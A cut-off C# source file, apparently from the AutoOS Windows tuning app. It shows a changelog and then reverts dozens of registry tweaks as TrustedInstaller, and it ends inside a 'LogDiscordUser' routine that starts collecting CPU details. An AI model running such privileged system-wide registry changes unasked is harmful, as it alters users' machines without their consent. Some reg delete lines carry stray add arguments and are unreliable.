using CommunityToolkit.WinUI.Controls;
using Downloader;
using Microsoft.UI.Text;
using Microsoft.UI.Xaml.Media;
using Microsoft.Win32;
using System.Management;
using System.Net;
using System.Text;
using System.Text.Json;
using Windows.Storage;
using AutoOS.Views.Installer.Actions;

namespace AutoOS.Views.Settings
{
    public sealed partial class HomeLandingPage : Page
    {
        private readonly ApplicationDataContainer localSettings = ApplicationData.Current.LocalSettings;
        private static readonly HttpClient httpClient = new();
        private readonly TextBlock StatusText = new()
        {
            Margin = new Thickness(0, 12, 0, 0),
            FontSize = 14,
            FontWeight = FontWeights.Medium
        };

        private readonly ProgressBar ProgressBar = new()
        {
            Margin = new Thickness(0, 12, 0, 0)
        };
        public HomeLandingPage()
        {
            InitializeComponent();
            #if !DEBUG
                Loaded += GetChangeLog;
            #endif
        }

        private async void GetChangeLog(object sender, RoutedEventArgs e)
        {
            string storedVersion = localSettings.Values["Version"] as string;
            string currentVersion = ProcessInfoHelper.Version;

            if (storedVersion != currentVersion)
            {
                try
                {
                    httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("AutoOS");

                    using var doc = JsonDocument.Parse(await httpClient.GetStringAsync($"https://api.github.com/repos/tinodin/AutoOS/releases/tags/v{currentVersion}"));

                    if (doc.RootElement.TryGetProperty("body", out var body))
                    {
                        string rawChangelog = body.GetString()!;
                        string changelog = rawChangelog.Replace("`", "")[rawChangelog.IndexOf("- ")..];

                        var contentDialog = new ContentDialog
                        {
                            Title = $"What’s new in AutoOS v{currentVersion}",
                            Content = new ScrollViewer
                            {
                                Content = new MarkdownTextBlock
                                {
                                    Text = changelog,
                                    Config = new MarkdownConfig()
                                },
                                Padding = new Thickness(0, 0, 36, 0)
                            },
                            CloseButtonText = "Close",
                            XamlRoot = XamlRoot
                        };

                        contentDialog.Resources["ContentDialogMaxWidth"] = 1000;
                        await contentDialog.ShowAsync();
                    }
                }
                catch
                {

                }

                await Update();

                StatusText.Text = "Update complete.";
                localSettings.Values["Version"] = currentVersion;
                await LogDiscordUser();
            }
        }

        private async Task Update()
        {
            var updater = new ContentDialog
            {
                Title = "Updating AutoOS",
                Content = new StackPanel
                {
                    Children =
                    {
                        StatusText,
                        ProgressBar
                    }
                },
                PrimaryButtonText = "Done",
                IsPrimaryButtonEnabled = false,
                Resources = new ResourceDictionary
                {
                    ["ContentDialogMinWidth"] = 500,
                    ["ContentDialogMaxWidth"] = 1000
                },
                XamlRoot = XamlRoot
            };

            _ = updater.ShowAsync();

            string previousTitle = string.Empty;
            bool Discord = Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"));
            bool NVIDIA = false;

            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
            {
                foreach (var obj in searcher.Get())
                {
                    string name = obj["Name"]?.ToString();
                    string version = obj["DriverVersion"]?.ToString();

                    if (name != null)
                    {
                        if (name.Contains("NVIDIA", StringComparison.OrdinalIgnoreCase))
                        {
                            NVIDIA = true;
                        }
                    }
                }
            }

            var actions = new List<(string Title, Func<Task> Action, Func<bool> Condition)>
            {
                // revert microsoft edge settings
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AutofillCreditCardEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v EdgeCollectionsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v ShowMicrosoftRewards /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PersonalizationReportingEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v ShowRecommendationsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v WebWidgetAllowed /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v MathSolverEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v BackgroundModeEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v InAppSupportEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v StartupBoostEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v NewTabPageSearchBox /t REG_SZ /d ""redirect"" /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v TyposquattingCheckerEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v SiteSafetyServicesEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AlternateErrorPagesEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AutofillAddressEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PaymentMethodQueryEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PromotionalTabsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v VisualSearchEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AutoImportAtFirstRun /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v BlockExternalExtensions /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v FamilySafetySettingsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PasswordGeneratorEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PasswordManagerEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v PasswordMonitorAllowed /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v ResolveNavigationErrorsUseWebService /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v EdgeFollowEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AllowGamesMenu /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v BlockThirdPartyCookies /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v DefaultNotificationsSetting /t REG_DWORD /d 2 /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v DefaultGeolocationSetting /t REG_DWORD /d 2 /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AccessibilityImageLabelsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v QuickSearchShowMiniMenu /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v HubsSidebarEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v MicrosoftEdgeInsiderPromotionEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v WindowOcclusionEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v SpotlightExperiencesAndRecommendationsEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v NewTabPageAppLauncherEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v AddressBarMicrosoftSearchInBingProviderEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"" /v SearchInSidebarEnabled /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\EdgeUI"" /v DisableHelpSticker /f"), null),
                ("Reverting Microsoft Edge settings", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EdgeUI"" /v DisableHelpSticker /f"), null),

                // revert nagles algorithm
                ("Reverting Nagles Algorithm", async () => await ProcessActions.RunPowerShell(@"Get-NetAdapter | ForEach-Object { Remove-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$($_.InterfaceGuid)"" -Name ""TcpAckFrequency"" -ErrorAction SilentlyContinue; Remove-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$($_.InterfaceGuid)"" -Name ""TcpDelAckTicks"" -ErrorAction SilentlyContinue; Remove-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$($_.InterfaceGuid)"" -Name ""TCPNoDelay"" -ErrorAction SilentlyContinue }"), null),
                
                // revert timer coalescing
                ("Reverting timer coalescing", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Power"" /v ""CoalescingTimerInterval"" /f"), null),

                // revert "sign-in and lock last interactive user automatically after a restart" policy
                (@"Reverting ""Sign-in and lock last interactive user automatically after a restart"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableAutomaticRestartSignOn /f"), null),

                // revert automatic maintenance
                ("Reverting automatic maintenance", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance"" /v MaintenanceDisabled /f"), null),
                (@"Reverting ""Configure Scheduled Maintenance Behavior"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\ScheduledDiagnostics"" /f"), null),

                // revert game bar
                ("Reverting GameBar", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR"" /v ""AppCaptureEnabled"" /f"), null),
                ("Reverting GameBar", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\System\GameConfigStore"" /v ""GameDVR_Enabled"" /t REG_DWORD /d 1 /f"), null),

                // configure presentation modes
                ("Reverting presentation modes", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_CURRENT_USER\SYSTEM\GameConfigStore"" /v ""GameDVR_HonorUserFSEBehaviorMode"" /t REG_DWORD /d 0 /f"), null),
                ("Reverting presentation modes", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_CURRENT_USER\SYSTEM\GameConfigStore"" /v ""GameDVR_DXGIHonorFSEWindowsCompatible"" /t REG_DWORD /d 0 /f"), null),
                ("Reverting presentation modes", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_CURRENT_USER\SYSTEM\GameConfigStore"" /v ""GameDVR_FSEBehavior"" /f"), null),
                ("Reverting presentation modes", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Dwm"" /v ""OverlayTestMode"" /f"), null),

                // revert shortcut text creation
                ("Reverting shortcut text creation", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"" /v link /f"), null),

                // revert Wi-Fi auto-connect policy
                (@"Reverting ""Allow Windows to automatically connect to suggested open hotspots, to networks shared by contacts, and to hotspots offering paid services"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WcmSvc\wifinetworkmanager\config"" /v AutoConnectAllowedOEM /f"), null),
                ("Reverting WiFi telemetry", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting"" /v value /f"), null),
                ("Reverting WiFi telemetry", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots"" /v value /f"), null),

                // revert disabling unnecessary services
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service"" /v Start /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DPS"" /v Start /t REG_DWORD /d 2 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\FontCache3.0.0.0"" /v ""Start"" /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PcaSvc"" /v Start /t REG_DWORD /d 2 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiServiceHost"" /v Start /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiSystemHost"" /v Start /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wecsvc"" /v Start /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WerSvc"" /v Start /t REG_DWORD /d 3 /f"), null),
                ("Reverting disabling unnecessary services", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wisvc"" /v Start /t REG_DWORD /d 3 /f"), null),

                // revert potentially unwanted windows programs
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AggregatorHost.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BCILauncher.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BGAUpsell.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BingChatInstaller.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CompatTelRunner.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DeviceCensus.exe"" /f"), null),
                ("Reverting potentially unwanted windows programs", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FeatureLoader.exe"" /f"), null),

                // revert "disable diagnostic data viewer" policy
                (@"Reverting ""Disable diagnostic data viewer"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DataCollection"" /v DisableDiagnosticDataViewer /f"), null),

                // revert app access to account info
                ("Reverting disabling app access to account info", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"" /f"), null),

                // remove autoplay policy
                (@"Reverting ""Disallow Autoplay for non-volume devices"" policy", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer"" /v NoAutoplayfornonVolume /f"), null),
                
                // revert disk space checks
                ("Reverting disk space checks", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLowDiskSpaceChecks /f"), null),
                ("Reverting disk space checks", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager"" /v BootExecute /t REG_MULTI_SZ /d ""autocheck autochk *"" /f"), null),
                ("Reverting disk space checks", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Dfrg\BootOptimizeFunction"" /v Enable /f"), null),
                ("Reverting disk space checks", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OptimalLayout"" /v EnableAutoLayout /f"), null),
                
                // bluetooth & devices -> autoplay
                (@"Disabling ""Use AutoPlay for all media and devices""", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers"" /v DisableAutoplay /t REG_DWORD /d 1 /f"), null),

                // set "turn off autoplay" policy to "all drives"
                (@"Setting ""Turn off Autoplay"" policy to ""All drives""", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f"), null),

                // revert save your work prompt
                ("Reverting save your work prompt", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v AutoEndTasks /f"), null),
                ("Reverting save your work prompt", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_USERS\.DEFAULT\Control Panel\Desktop"" /v AutoEndTasks /f"), null),

                // revert delay to end tasks on shutdown screen
                ("Reverting delay to end tasks on shutdown screen", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v HungAppTimeout /f"), null),
                ("Reverting delay to end tasks on shutdown screen", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_USERS\.DEFAULT\Control Panel\Desktop"" /v HungAppTimeout /f"), null),
                ("Reverting delay to end tasks on shutdown screen", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v WaitToKillAppTimeout /f"), null),
                ("Reverting delay to end tasks on shutdown screen", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_USERS\.DEFAULT\Control Panel\Desktop"" /v WaitToKillAppTimeout /f"), null),

                // revert delay for low-level hooks
                ("Reverting delay for low-level hooks", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v LowLevelHooksTimeout /f"), null),
                ("Reverting delay for low-level hooks", async () => await ProcessActions.RunNsudo("CurrentUser", @"reg delete ""HKEY_USERS\.DEFAULT\Control Panel\Desktop"" /v LowLevelHooksTimeout /f"), null),

                // revert delay to end services on shutdown
                ("Reverting delay to end services on shutdown", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control"" /v WaitToKillServiceTimeout /t REG_SZ /d 5000 /f"), null),

                // update vencord plugins
                ("Update Vencord Plugins", async () => await ProcessActions.Sleep(1000), () => Discord == true),
                ("Update Vencord Plugins", async () => await Task.Run(() => File.Copy(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Assets", "Scripts", "settings.json"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Vencord", "settings", "settings.json"), true)), () => Discord == true),
                
                // set "win32priorityseparation" to 0x18/24
                (@"Setting ""Win32PrioritySeparation"" to 0x18/24", async () => await ProcessActions.RunNsudo("TrustedInstaller", @"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v Win32PrioritySeparation /t REG_DWORD /d 24 /f"), null),

                // import optimized nvidia profile
                ("Importing optimized NVIDIA profile", async () => await ProcessActions.ImportProfile("BaseProfile.nip"), () => NVIDIA == true),
            };

            var filteredActions = actions.Where(a => a.Condition == null || a.Condition.Invoke()).ToList();
            int groupedTitleCount = 0;

            List<Func<Task>> currentGroup = [];

            for (int i = 0; i < filteredActions.Count; i++)
            {
                if (i == 0 || filteredActions[i].Title != filteredActions[i - 1].Title)
                {
                    groupedTitleCount++;
                }
            }

            double incrementPerTitle = groupedTitleCount > 0 ? 100 / (double)groupedTitleCount : 0;

            foreach (var (title, action, condition) in filteredActions)
            {
                if (previousTitle != string.Empty && previousTitle != title && currentGroup.Count > 0)
                {
                    foreach (var groupedAction in currentGroup)
                    {
                        try
                        {
                            await groupedAction();
                        }
                        catch (Exception ex)
                        {
                            StatusText.Text = ex.Message;
                            ProgressBar.Foreground = (Brush)Application.Current.Resources["SystemFillColorCriticalBrush"];
                        }
                    }

                    ProgressBar.Value += incrementPerTitle;
                    await Task.Delay(250);
                    currentGroup.Clear();
                }

                StatusText.Text = title + "...";
                currentGroup.Add(action);
                previousTitle = title;
            }

            if (currentGroup.Count > 0)
            {
                foreach (var groupedAction in currentGroup)
                {
                    try
                    {
                        await groupedAction();
                    }
                    catch (Exception ex)
                    {
                        StatusText.Text = ex.Message;
                        ProgressBar.Foreground = (Brush)Application.Current.Resources["SystemFillColorCriticalBrush"];
                    }
                }
                ProgressBar.Value += incrementPerTitle;
            }

            updater.IsPrimaryButtonEnabled = true;
        }

        public async Task RunDownload(string url, string path, string file = null)
        {
            string title = StatusText.Text;

            var uiContext = SynchronizationContext.Current;

            DownloadBuilder downloadBuilder;

            if (url.Contains("raw.githubusercontent.com", StringComparison.OrdinalIgnoreCase))
            {
                using var client = new HttpClient();
                await File.WriteAllTextAsync(string.IsNullOrWhiteSpace(file) ? path : Path.Combine(path, file), await client.GetStringAsync(url), Encoding.UTF8);
                return;
            }
            else if (url.Contains("drivers.amd.com", StringComparison.OrdinalIgnoreCase))
            {
                var config = new DownloadConfiguration
                {
                    RequestConfiguration = new RequestConfiguration
                    {
                        Headers = new WebHeaderCollection
                        {
                            { "Referer", "https://www.amd.com/en/support/downloads/drivers.html" }
                        }
                    }
                };

                downloadBuilder = DownloadBuilder.New()
                    .WithUrl(url)
                    .WithDirectory(path)
                    .WithConfiguration(config);
            }
            else
            {
                downloadBuilder = DownloadBuilder.New()
                    .WithUrl(url)
                    .WithDirectory(path)
                    .WithConfiguration(new DownloadConfiguration());
            }

            if (!string.IsNullOrWhiteSpace(file))
            {
                downloadBuilder.WithFileName(file);
            }

            var download = downloadBuilder.Build();

            DateTime lastLoggedTime = DateTime.MinValue;

            double receivedMB = 0.0;
            double totalMB = 0.0;
            double speedMB = 0.0;
            double percentage = 0.0;

            download.DownloadProgressChanged += (sender, e) =>
            {
                if ((DateTime.Now - lastLoggedTime).TotalMilliseconds < 50)
                    return;

                lastLoggedTime = DateTime.Now;

                speedMB = e.BytesPerSecondSpeed / (1024.0 * 1024.0);
                receivedMB = e.ReceivedBytesSize / (1024.0 * 1024.0);
                totalMB = e.TotalBytesToReceive / (1024.0 * 1024.0);
                percentage = e.ProgressPercentage;

                uiContext?.Post(_ =>
                {
                    StatusText.Text = $"{title} ({speedMB:F1} MB/s - {receivedMB:F2} MB of {totalMB:F2} MB)";
                }, null);
            };

            download.DownloadFileCompleted += (sender, e) =>
            {
                uiContext?.Post(_ =>
                {
                    StatusText.Text = $"{title} ({speedMB:F1} MB/s - {totalMB:F2} MB of {totalMB:F2} MB)";
                }, null);
            };

            await download.StartAsync();
        }

        public static async Task LogDiscordUser()
        {
            var cpuObj = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor")
                            .Get()
